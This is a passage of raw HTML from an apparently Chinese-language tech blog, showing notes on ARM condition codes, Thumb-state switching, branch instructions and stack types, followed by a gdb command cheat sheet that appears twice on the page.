<span class="comment">; Branch instruction can only be used in the last instruction of an IT block</span></span><br></pre></td></tr></table></figure>

<p>以下是条件代码及其对立的条件：</p>
<table>
<thead>
<tr>
<th>Code</th>
<th>Meaning</th>
<th>Code</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>EQ</td>
<td>Equal</td>
<td>NE</td>
<td>Not Equal</td>
</tr>
<tr>
<td>HS(or CS)</td>
<td>Unsigned higher or same(or carry set)</td>
<td>LO(or CC</td>
<td>Unsigned lower(or carry clear)</td>
</tr>
<tr>
<td>MI</td>
<td>Negative</td>
<td>PL</td>
<td>Positive or Zero</td>
</tr>
<tr>
<td>VS</td>
<td>Signed Overflow</td>
<td>VC</td>
<td>No Signed Overflow</td>
</tr>
<tr>
<td>HI</td>
<td>Unsigned Higher</td>
<td>LS</td>
<td>Unsigned Lower or Same</td>
</tr>
<tr>
<td>GE</td>
<td>Signed Greater Than or Equal</td>
<td>LT</td>
<td>Signed Less Than</td>
</tr>
<tr>
<td>GT</td>
<td>Signed Greater Than</td>
<td>LE</td>
<td>Signed Less Than or Equal</td>
</tr>
<tr>
<td>AL (or omitted)</td>
<td>Always Executed</td>
<td>There is no opposite to AL</td>
<td>–</td>
</tr>
</tbody></table>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.syntax</span> unified    <span class="comment">@ this is important!</span></span><br><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="meta">.code</span> <span class="number">32</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>   <span class="comment">@ increase value of PC by 1 and add it to R3</span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">r3</span>            <span class="comment">@ branch + exchange to the address in R3 -&gt; switch to Thumb state because LSB = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">.code</span> <span class="number">16</span>         <span class="comment">@ Thumb state</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#10</span>      </span><br><span class="line">    <span class="keyword">ite</span> eq           <span class="comment">@ if R0 is equal 10...</span></span><br><span class="line">    <span class="keyword">addeq</span> <span class="built_in">r1</span>, <span class="number">#2</span>     <span class="comment">@ ... then R1 = R1 + 2</span></span><br><span class="line">    <span class="keyword">addne</span> <span class="built_in">r1</span>, <span class="number">#3</span>     <span class="comment">@ ... else R1 = R1 + 3</span></span><br><span class="line">    bkpt</span><br></pre></td></tr></table></figure>

<p>.code 32</p>
<p>此示例代码以ARM状态开始。第一条指令将 PC 加 1 指定的地址添加到 R3，然后分支到 R3 中的地址。这将导致切换到拇指状态，因为LSB（最不重要的位）是1，因此不是4字节对齐的。为此使用bx（分支+交换）很重要。在分支之后设置T（拇指）标志，我们处于拇指状态。</p>
<p>.code 16</p>
<p>在拇指状态下，我们首先将R0与#10进行比较，这将设置负标志（0–10 = – 10）。然后我们使用If-Then-Else块。此块将跳过ADDEQ指令，因为没有设置Z（零）标志，并将执行ADDNE指令，因为结果为NE（不等于）为10。</p>
<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><h4 id="B-BX-BLX"><a href="#B-BX-BLX" class="headerlink" title="B / BX / BLX"></a>B / BX / BLX</h4><p>存在三种类型的分支指令：</p>
<p>Branch (B)</p>
<pre><code>简单跳转到函数
</code></pre>
<p>Branch link (BL)</p>
<pre><code>在 LR 中保存 (PC+4) 并跳转到函数
</code></pre>
<p>Branch exchange (BX) and Branch link exchange (BLX)</p>
<pre><code>与 B/BL + 交换指令集相同 (ARM &lt;-&gt; Thumb)
需要一个寄存器作为第一个操作数：BX/BLX reg
</code></pre>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><table>
<thead>
<tr>
<th>Stack Type</th>
<th>Store</th>
<th>Load</th>
</tr>
</thead>
<tbody><tr>
<td>Full descending</td>
<td>STMFD (STMDB, Decrement Before)</td>
<td>LDMFD (LDM, Increment after)</td>
</tr>
<tr>
<td>Full ascending</td>
<td>STMFA (STMIB, Increment Before)</td>
<td>LDMFA (LDMDA, Decrement After)</td>
</tr>
<tr>
<td>Empty descending</td>
<td>STMED (STMDA, Decrement After)</td>
<td>LDMED (LDMIB, Increment Before)</td>
</tr>
<tr>
<td>Empty ascending</td>
<td>STMEA (STM, Increment after)</td>
<td>LDMEA (LDMDB, Decrement Before)</td>
</tr>
</tbody></table>
<p>◎ Full descending 满递减堆栈<br>堆栈首部是高地址，堆栈向低地址增长。栈指针总是指向堆栈最后一个元素(最后一个元素是最后压入的数据)。<br>ARM-Thumb过程调用标准和ARM、Thumb C/C++ 编译器总是使用Full descending 类型堆栈。</p>
<p>◎ Full ascending 满递增堆栈<br>堆栈首部是低地址，堆栈向高地址增长。栈指针总是指向堆栈最后一个元素(最后一个元素是最后压入的数据)。</p>
<p>◎ Empty descending 空递减堆栈<br>堆栈首部是低地址，堆栈向高地址增长。栈指针总是指向下一个将要放入数据的空位置。</p>
<p>◎ Empty ascending 空递增堆栈<br>堆栈首部是高地址，堆栈向低地址增长。栈指针总是指向下一个将要放入数据的空位置。</p>

	
	</div>
  <a type="button" href="/2021/08/11/Arm Instractions/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/03/gdb使用总结/" >gdb使用总结</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-03  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
		
            
            <p class="post">&lt;h1 id=&#34;gdb使用总结&#34;&gt;&lt;a href=&#34;#gdb使用总结&#34; class=&#34;headerlink&#34; title=&#34;gdb使用总结&#34;&gt;&lt;/a&gt;gdb使用总结&lt;/h1&gt;&lt;h2 id=&#34;一、编译测试程序&#34;&gt;&lt;a href=&#34;#一、编译测试程序&#34; class=&#34;headerlink&#34; title=&#34;一、编译测试程序&#34;&gt;&lt;/a&gt;一、编译测试程序&lt;/h2&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gcc test.c -o test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;二、从磁盘中加载二进制文件&#34;&gt;&lt;a href=&#34;#二、从磁盘中加载二进制文件&#34; class=&#34;headerlink&#34; title=&#34;二、从磁盘中加载二进制文件&#34;&gt;&lt;/a&gt;二、从磁盘中加载二进制文件&lt;/h2&gt;&lt;p&gt;方法1:&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gdb --quite ./test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;方法2:&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gdb -q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(gdb) file ./test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;三、运行程序&#34;&gt;&lt;a href=&#34;#三、运行程序&#34; class=&#34;headerlink&#34; title=&#34;三、运行程序&#34;&gt;&lt;/a&gt;三、运行程序&lt;/h2&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) r&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;带CLI参数：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) r argv[0] argv[1] ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;运行程序并断在入口点处：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;带CLI参数：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) start argv[0] ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;断点之后继续运行：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb)c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;四、断点操作&#34;&gt;&lt;a href=&#34;#四、断点操作&#34; class=&#34;headerlink&#34; title=&#34;四、断点操作&#34;&gt;&lt;/a&gt;四、断点操作&lt;/h2&gt;&lt;h3 id=&#34;设置断点&#34;&gt;&lt;a href=&#34;#设置断点&#34; class=&#34;headerlink&#34; title=&#34;设置断点&#34;&gt;&lt;/a&gt;设置断点&lt;/h3&gt;&lt;p&gt;有符号：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) break main&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;or&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) b main&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;设置地址：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) break *addr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;检查断点&#34;&gt;&lt;a href=&#34;#检查断点&#34; class=&#34;headerlink&#34; title=&#34;检查断点&#34;&gt;&lt;/a&gt;检查断点&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) info breakpoints&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;or&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) info b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;禁用启用断点&#34;&gt;&lt;a href=&#34;#禁用启用断点&#34; class=&#34;headerlink&#34; title=&#34;禁用启用断点&#34;&gt;&lt;/a&gt;禁用启用断点&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) disable num&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) enable num&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;删除断点&#34;&gt;&lt;a href=&#34;#删除断点&#34; class=&#34;headerlink&#34; title=&#34;删除断点&#34;&gt;&lt;/a&gt;删除断点&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) clear *addr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;or&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) clear main&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;or&lt;/p&gt;
&lt;p&gt;“delete &amp;lt;breakpoint number from info breakpoints&amp;gt;“ (short form: d)&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) delete 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;检查汇编代码&#34;&gt;&lt;a href=&#34;#检查汇编代码&#34; class=&#34;headerlink&#34; title=&#34;检查汇编代码&#34;&gt;&lt;/a&gt;检查汇编代码&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(gdb) disassemble &amp;lt;address or symbol name&amp;gt; /r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt;/r显示16进制的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
<p>
		

	

	</div>
  <a type="button" href="/2021/08/03/gdb使用总结/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h1 id="gdb使用总结"><a href="#gdb使用总结" class="headerlink" title="gdb使用总结"></a>gdb使用总结</h1><h2 id="一、编译测试程序"><a href="#一、编译测试程序" class="headerlink" title="一、编译测试程序"></a>一、编译测试程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test</span><br></pre></td></tr></table></figure>

<h2 id="二、从磁盘中加载二进制文件"><a href="#二、从磁盘中加载二进制文件" class="headerlink" title="二、从磁盘中加载二进制文件"></a>二、从磁盘中加载二进制文件</h2><p>方法1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --quite ./test</span><br></pre></td></tr></table></figure>

<p>方法2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -q</span><br><span class="line">(gdb) file ./test</span><br></pre></td></tr></table></figure>

<h2 id="三、运行程序"><a href="#三、运行程序" class="headerlink" title="三、运行程序"></a>三、运行程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r</span><br></pre></td></tr></table></figure>

<p>带CLI参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r argv[0] argv[1] ...</span><br></pre></td></tr></table></figure>

<p>运行程序并断在入口点处：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>

<p>带CLI参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start argv[0] ...</span><br></pre></td></tr></table></figure>

<p>断点之后继续运行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb)c</span><br></pre></td></tr></table></figure>

<h2 id="四、断点操作"><a href="#四、断点操作" class="headerlink" title="四、断点操作"></a>四、断点操作</h2><h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><p>有符号：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break main</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b main</span><br></pre></td></tr></table></figure>

<p>设置地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break *addr</span><br></pre></td></tr></table></figure>

<h3 id="检查断点"><a href="#检查断点" class="headerlink" title="检查断点"></a>检查断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info breakpoints</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info b</span><br></pre></td></tr></table></figure>

<h3 id="禁用启用断点"><a href="#禁用启用断点" class="headerlink" title="禁用启用断点"></a>禁用启用断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disable num</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) enable num</span><br></pre></td></tr></table></figure>

<h3 id="删除断点"><a href="#删除断点" class="headerlink" title="删除断点"></a>删除断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) clear *addr</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) clear main</span><br></pre></td></tr></table></figure>

<p>or</p>
<p>“delete &lt;breakpoint number from info breakpoints&gt;“ (short form: d)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) delete 3</span><br></pre></td></tr></table></figure>

<h3 id="检查汇编代码"><a href="#检查汇编代码" class="headerlink" title="检查汇编代码"></a>检查汇编代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble &lt;address or symbol name&gt; /r</span><br><span class="line"><span class="meta">#</span><span class="bash">/r显示16进制的数据</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10i &lt;addr&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash">显示10条汇编</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) display/10i &lt;instruction pointer / program counter&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash">On x86 systems &lt;instruction pointer / program counter&gt; would be <span class="variable">$rip</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">On ARM systems &lt;instruction pointer / program counter&gt; would be <span class="variable">$pc</span></span></span><br></pre></td></tr></table></figure>

<h3 id="监视断点"><a href="#监视断点" class="headerlink" title="监视断点"></a>监视断点</h3><h4 id="只写断点"><a href="#只写断点" class="headerlink" title="只写断点"></a>只写断点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) watch &lt;address&gt;</span><br></pre></td></tr></table></figure>

<h4 id="只读断点"><a href="#只读断点" class="headerlink" title="只读断点"></a>只读断点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) rwatch &lt;address&gt;</span><br></pre></td></tr></table></figure>

<h4 id="读写断点"><a href="#读写断点" class="headerlink" title="读写断点"></a>读写断点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awatch &lt;address&gt;</span><br></pre></td></tr></table></figure>

<h4 id="设置访问断点的大小"><a href="#设置访问断点的大小" class="headerlink" title="设置访问断点的大小"></a>设置访问断点的大小</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) watch *(char *) &lt;address&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash">would <span class="built_in">set</span> a watchpoint to <span class="built_in">break</span> on access to the one byte at &lt;address&gt;, and therefore wouldn\<span class="string">&#x27;t fire if address+2 was written to. Whereas</span></span></span><br><span class="line"></span><br><span class="line">(gdb )watch *(long long *) &lt;address&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">would fire if any of the 8 bytes starting at &lt;address&gt; were written to.</span></span></span><br></pre></td></tr></table></figure>

<h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>使用”hbreak” 命令 (short form: hb) 用法与break相似</p>
<h2 id="检查-修改数据"><a href="#检查-修改数据" class="headerlink" title="检查/修改数据"></a>检查/修改数据</h2><p>Commands: x (examine), print, display</p>
<p>格式化输出：<br>后边跟/nFMT</p>
<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">10.5 Output Formats</span><br><span class="line"></span><br><span class="line">By default, GDB prints a value according to its data type. Sometimes this is not what you want. For example, you might want to print a number in hex, or a pointer in decimal. Or you might want to view data in memory at a certain address as a character string or as an instruction. To do these things, specify an output format when you print a 